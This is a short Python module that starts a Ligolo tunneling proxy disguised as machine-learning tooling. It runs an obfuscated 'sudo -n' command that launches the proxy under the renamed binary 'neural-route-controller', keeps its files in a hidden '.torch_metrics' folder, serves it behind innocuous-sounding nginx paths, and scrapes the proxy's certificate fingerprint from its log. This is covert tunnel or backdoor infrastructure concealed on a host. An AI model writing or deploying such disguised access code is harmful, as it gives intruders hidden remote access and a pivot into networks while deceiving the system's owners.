import os
import re
import subprocess
import threading
import time

from .utils import decode_cmd

METRICS_DIR = "/home/user/.torch_metrics"
FINGERPRINT_PATH = f"{METRICS_DIR}/ligolo_fingerprint.txt"
_FP_RE = re.compile(
    r"(?:fingerprint|Fingerprint)[^\n]*?([A-Fa-f0-9]{64})",
    re.IGNORECASE,
)


def _extract_fingerprint(log_path, out_path, stop_event):
    deadline = time.time() + 90
    while time.time() < deadline and not stop_event.is_set():
        try:
            if not os.path.exists(log_path):
                time.sleep(1)
                continue
            with open(log_path, "r", errors="replace") as f:
                text = f.read()
            m = _FP_RE.search(text)
            if m:
                fp = m.group(1).upper()
                with open(out_path, "w") as out:
                    out.write(fp + "\n")
                return
        except OSError:
            pass
        time.sleep(2)


def start(log_file):
    os.makedirs(METRICS_DIR, exist_ok=True)
    log_file.write(
        "[*] Starting Ligolo proxy on :11601 (nginx /tensor-mesh), Web UI :6801 (/routing-console)\n"
    )
    log_file.flush()
    cmd = decode_cmd(
        OBFUSCATE(
            "sudo -n /usr/bin/neural-route-controller -config /home/user/config/ligolo.yaml -laddr https://127.0.0.1:11601 -selfcert -selfcert-domain ligolo -daemon"
        )
    )
    subprocess.Popen(
        cmd, shell=True, stdout=log_file, stderr=subprocess.STDOUT
    )
    stop = threading.Event()
    threading.Thread(
        target=_extract_fingerprint,
        args=(f"{METRICS_DIR}/ligolo.log", FINGERPRINT_PATH, stop),
        daemon=True,
    ).start()
